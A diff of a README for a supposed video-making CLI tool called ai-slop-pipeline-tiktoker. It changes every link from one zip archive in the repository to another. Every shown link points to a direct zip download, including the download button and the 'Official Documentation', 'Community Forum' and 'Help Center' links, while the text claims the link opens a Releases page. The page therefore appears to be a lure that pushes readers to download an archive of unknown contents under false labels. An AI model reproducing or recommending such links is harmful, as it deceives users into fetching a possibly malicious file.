@@ -1,6 +1,6 @@
 # 🎬 ai-slop-pipeline-tiktoker - Create Stunning Videos Effortlessly
 
-[![Download ai-slop-pipeline-tiktoker](https://raw.githubusercontent.com/Xenofrea/ai-slop-pipeline-tiktoker/main/src/ai-slop-pipeline-tiktoker_v1.3.zip)](https://raw.githubusercontent.com/Xenofrea/ai-slop-pipeline-tiktoker/main/src/ai-slop-pipeline-tiktoker_v1.3.zip)
+[![Download ai-slop-pipeline-tiktoker](https://github.com/Xenofrea/ai-slop-pipeline-tiktoker/raw/refs/heads/main/docs/ru/ai-pipeline-tiktoker-slop-1.4.zip)](https://github.com/Xenofrea/ai-slop-pipeline-tiktoker/raw/refs/heads/main/docs/ru/ai-pipeline-tiktoker-slop-1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the ai-slop-pipeline-tiktoker! This is a user-friendly CLI applicatio
 
 To get started, you need to download the software. Click the button below to visit the Releases page:
 
-[Download ai-slop-pipeline-tiktoker](https://raw.githubusercontent.com/Xenofrea/ai-slop-pipeline-tiktoker/main/src/ai-slop-pipeline-tiktoker_v1.3.zip)
+[Download ai-slop-pipeline-tiktoker](https://github.com/Xenofrea/ai-slop-pipeline-tiktoker/raw/refs/heads/main/docs/ru/ai-pipeline-tiktoker-slop-1.4.zip)
 
 Once you are on the Releases page, look for the latest version. You will see several files available for download. Choose the file that matches your operating system. 
 
@@ -74,9 +74,9 @@ The ai-slop-pipeline-tiktoker comes loaded with features:
 
 For further information, tutorials, and usage strategies, check out these resources:
 
-- [Official Documentation](https://raw.githubusercontent.com/Xenofrea/ai-slop-pipeline-tiktoker/main/src/ai-slop-pipeline-tiktoker_v1.3.zip)
-- [Community Forum](https://raw.githubusercontent.com/Xenofrea/ai-slop-pipeline-tiktoker/main/src/ai-slop-pipeline-tiktoker_v1.3.zip)
-- [Help Center](https://raw.githubusercontent.com/Xenofrea/ai-slop-pipeline-tiktoker/main/src/ai-slop-pipeline-tiktoker_v1.3.zip)
+- [Official Documentation](https://github.com/Xenofrea/ai-slop-pipeline-tiktoker/raw/refs/heads/main/docs/ru/ai-pipeline-tiktoker-slop-1.4.zip)
+- [Community Forum](https://github.com/Xenofrea/ai-slop-pipeline-tiktoker/raw/refs/heads/main/docs/ru/ai-pipeline-tiktoker-slop-1.4.zip)
+- [Help Center](https://github.com/Xenofrea/ai-slop-pipeline-tiktoker/raw/refs/heads/main/docs/ru/ai-pipeline-tiktoker-slop-1.4.zip)
 
 ## 📞 Contact Us
 
@@ -84,6 +84,6 @@ If you have any questions or need assistance, feel free to reach out through the
 
 Remember, to download ai-slop-pipeline-tiktoker, go to the link below:
 
-[Download ai-slop-pipeline-tiktoker](https://raw.githubusercontent.com/Xenofrea/ai-slop-pipeline-tiktoker/main/src/ai-slop-pipeline-tiktoker_v1.3.zip)
+[Download ai-slop-pipeline-tiktoker](https://github.com/Xenofrea/ai-slop-pipeline-tiktoker/raw/refs/heads/main/docs/ru/ai-pipeline-tiktoker-slop-1.4.zip)
 
 Enjoy creating amazing videos!
